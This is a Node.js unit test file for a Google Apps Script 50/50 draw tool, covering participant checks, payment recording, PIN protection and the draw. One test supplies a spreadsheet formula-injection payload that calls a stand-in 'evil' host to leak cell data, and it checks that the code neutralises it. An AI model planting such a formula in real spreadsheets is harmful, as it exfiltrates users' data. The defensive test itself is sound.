#!/usr/bin/env node
const fs = require('fs');
const assert = require('assert');

/**
 * Unit tests for Code.gs against a small mock of the Apps Script services.
 * Usage: node test-code.js
 */
const src = fs.readFileSync(__dirname + '/Code.gs', 'utf8');

function makeSheet(name, rows) {
  const sheet = {
    rows, getName: () => name, getLastRow: () => rows.length,
    getRange(r, c, nr = 1, nc = 1) {
      if (typeof r === 'string') return { setNumberFormat(){} };
      return {
        getValues() { const out=[]; for (let i=0;i<nr;i++){ const row=rows[r-1+i]||[]; out.push(Array.from({length:nc},(_,j)=>row[c-1+j] ?? '')); } return out; },
        setValues(v) { v.forEach((row,i)=>{ rows[r-1+i]=rows[r-1+i]||[]; row.forEach((x,j)=>rows[r-1+i][c-1+j]=x); }); },
        getValue() { return (rows[r-1]||[])[c-1] ?? ''; },
        setValue(x) { rows[r-1]=rows[r-1]||[]; rows[r-1][c-1]=x; },
        setFontWeight(){},
      };
    },
    appendRow(row) { rows.push(row.slice()); },
  };
  return sheet;
}
const participants = makeSheet('Participants', [
  ['Email','Name','Draws Remaining','Last Paid'],
  ['a@x.com','Alice Able', 2, ''],
  ['b@x.com','Bob Baker', 0, ''],
  ['c@x.com','Cathy Cole', '', ''],
  ['','','',''],
  ['d@x.com','Dan Dow', 1, ''],
]);
const winners = makeSheet('Winners', [['Timestamp','Winner Name','Winner Email','Participant Count','By','Draws Remaining','Paid Up','Prize','Carry-over']]);
const sheets = { Participants: participants, Winners: winners };

const alerts = [];
let props = {};
const ui = { ButtonSet:{OK:'OK',YES_NO:'YES_NO'}, Button:{YES:'YES',NO:'NO'}, alert(title, msg){ alerts.push([title, msg]); return 'YES'; } };
const ss = { getSheetByName: n => sheets[n] || null, insertSheet(n){ return (sheets[n] = makeSheet(n, [])); } };
const SpreadsheetApp = { getActiveSpreadsheet: () => ss, getUi: () => ui };
const LockService = { getScriptLock: () => ({ waitLock(){}, releaseLock(){} }) };
const Session = { getActiveUser: () => ({ getEmail: () => 'owner@x.com' }) };
const ScriptApp = { getService: () => ({ getUrl: () => 'https://script.google.com/x/exec' }) };
const PropertiesService = { getScriptProperties: () => ({ getProperty: k => props[k] || null }) };
const HtmlService = { createHtmlOutputFromFile: () => ({ setTitle(){ return this; }, addMetaTag(){ return this; } }) };
const Logger = { log: () => {} };
const api = new Function('SpreadsheetApp','LockService','Session','ScriptApp','PropertiesService','HtmlService','Logger',
  src + '\nreturn {conductDraw, checkParticipants, webListNames, webRecordPayment, readParticipants_, doGet};')(
  SpreadsheetApp, LockService, Session, ScriptApp, PropertiesService, HtmlService, Logger);

// private functions must not leak: every function name except the public API ends with _
const publicFns = src.match(/^function (\w+)\(/gm).map(s => s.replace(/^function |\($/g, ''));
const allowed = ['onOpen','conductDraw','checkParticipants','shuffle','doGet','webListNames','webRecordPayment'];
publicFns.forEach(f => assert.ok(f.endsWith('_') || allowed.includes(f), 'unexpected public function: ' + f));

// readParticipants_
let d = api.readParticipants_();
assert.deepStrictEqual(d.problems, []);
assert.deepStrictEqual(d.participants.map(p=>[p.name,p.draws]), [['Alice Able',2],['Bob Baker',0],['Cathy Cole',0],['Dan Dow',1]]);

// duplicates block the draw and the payment page
participants.rows.push(['A@X.com','alice able', 0, '']);
d = api.readParticipants_();
assert.deepStrictEqual(d.problems, ['Rows 2, 7: duplicate name "alice able"', 'Rows 2, 7: duplicate email "a@x.com"']);
alerts.length = 0; api.conductDraw();
assert.strictEqual(alerts[0][0], 'Cannot Conduct Draw - Problems in Participants Sheet');
assert.strictEqual(winners.rows.length, 1);
assert.throws(() => api.webRecordPayment('', 'Alice Able', 1), /appears more than once.*rows 2, 7.*Nothing recorded/);
assert.strictEqual(participants.rows[1][2], 2);
assert.match(sheets.Payments.rows[1][6], /^ERROR: "Alice Able" appears more than once/);
sheets.Payments.rows.splice(1); // reset ledger for the counts below
participants.rows.pop();

// payments
assert.strictEqual(api.webRecordPayment('', 'bob baker', 3), 'Bob Baker: 3 draws paid. 0 -> 3 remaining.');
assert.strictEqual(participants.rows[2][2], 3);
assert.ok(participants.rows[2][3] instanceof Date);
assert.ok(sheets.Payments, 'Payments sheet auto-created');
assert.deepStrictEqual(sheets.Payments.rows[0], ['Timestamp','Participant','Draws Paid','Before','After','Recorded By','Result']);
assert.deepStrictEqual(sheets.Payments.rows[1].slice(1), ['Bob Baker', 3, 0, 3, 'payment page', 'OK']);
assert.strictEqual(api.webRecordPayment('', 'Alice Able', 1), 'Alice Able: 1 draw paid. 2 -> 3 remaining.');
assert.throws(() => api.webRecordPayment('', 'Nobody Here', 1), /not on the Participants sheet/);
assert.throws(() => api.webRecordPayment('', 'Alice Able', 0), /whole number from 1 to 100/);
assert.throws(() => api.webRecordPayment('', 'Alice Able', 'abc'), /whole number from 1 to 100/);
assert.throws(() => api.webRecordPayment('', 'Alice Able', 101), /whole number from 1 to 100/);
assert.match(api.webRecordPayment('', 'Dan Dow', 100), /Dan Dow: 100 draws paid. 1 -> 101 remaining./); participants.rows[5][2] = 1; sheets.Payments.rows.pop();
assert.throws(() => api.webRecordPayment('', '', 1), /Pick a name/);
assert.strictEqual(participants.rows.length, 6, 'page must never add rows');
assert.strictEqual(sheets.Payments.rows.length, 8, 'failed attempts are logged too');
const results = sheets.Payments.rows.slice(1).map(r => r[6]);
assert.strictEqual(results.filter(r => r === 'OK').length, 2);
assert.match(results[2], /^ERROR: "Nobody Here" is not on/);
assert.match(results[3], /^ERROR: Draws paid must be/);
assert.deepStrictEqual(sheets.Payments.rows[5].slice(1, 6), ['Alice Able', 'abc', '', '', 'payment page']);
assert.match(results[6], /^ERROR: Pick a name/);

// PIN
props.BAR_PIN = ' 1234 ';
assert.throws(() => api.webListNames(''), /PIN_REQUIRED/);
assert.throws(() => api.webRecordPayment('0000', 'Alice Able', 1), /PIN_REQUIRED/);
assert.strictEqual(sheets.Payments.rows[sheets.Payments.rows.length-1][6], 'ERROR: wrong or missing PIN');
assert.ok(Array.isArray(api.webListNames('1234')));
props = {};

// name list: surname order, everyone included, balances but never emails
assert.deepStrictEqual(api.webListNames(''), [{name:'Alice Able',draws:3},{name:'Bob Baker',draws:3},{name:'Cathy Cole',draws:0},{name:'Dan Dow',draws:1}]);
participants.rows[2][2] = 100;
participants.rows.push(['z@x.com','Zed Aardvark', 0, '']);
assert.deepStrictEqual(api.webListNames('').map(p=>p.name), ['Zed Aardvark','Alice Able','Bob Baker','Cathy Cole','Dan Dow']);
assert.ok(!JSON.stringify(api.webListNames('')).includes('@'), 'emails must not be returned');
participants.rows.pop(); participants.rows[2][2] = 3;

// formula injection: untrusted input never lands in a cell starting with = + - @
assert.throws(() => api.webRecordPayment('', '=IMAGE("http://evil/?"&A1)', '+1'), /not on the Participants sheet/);
const inj = sheets.Payments.rows[sheets.Payments.rows.length-1];
assert.strictEqual(inj[1], 'IMAGE("http://evil/?"&A1)');
assert.strictEqual(inj[2], '1');
sheets.Payments.rows.forEach(r => r.forEach(c => { if (typeof c === 'string') assert.ok(!/^[=+\-@]/.test(c), 'cell starts with formula char: ' + c); }));

// draw: alice 3, bob 3, cathy 0, dan 1 -> paid up 3, prize 3
alerts.length = 0;
api.conductDraw();
assert.deepStrictEqual(alerts.map(a=>a[0]), ['Conduct Draw?', '50/50 Draw Winner']);
assert.strictEqual(winners.rows.length, 2);
const w1 = winners.rows[1];
assert.strictEqual(w1[7], 3);
assert.deepStrictEqual(participants.rows.map(r=>r[2]).slice(1), [2,2,'','',0]);
assert.strictEqual(w1[8], w1[6]==='Yes' ? 0 : 3);
api.conductDraw();
const w2 = winners.rows[2];
assert.strictEqual(w2[7], 2 + w1[8]);

alerts.length = 0; api.checkParticipants();
assert.strictEqual(alerts[0][0], 'Participant List OK');
console.log('ALL MOCK TESTS PASSED');
console.log('winners:', winners.rows.slice(1).map(r=>[r[1],r[6],r[7],r[8]]));
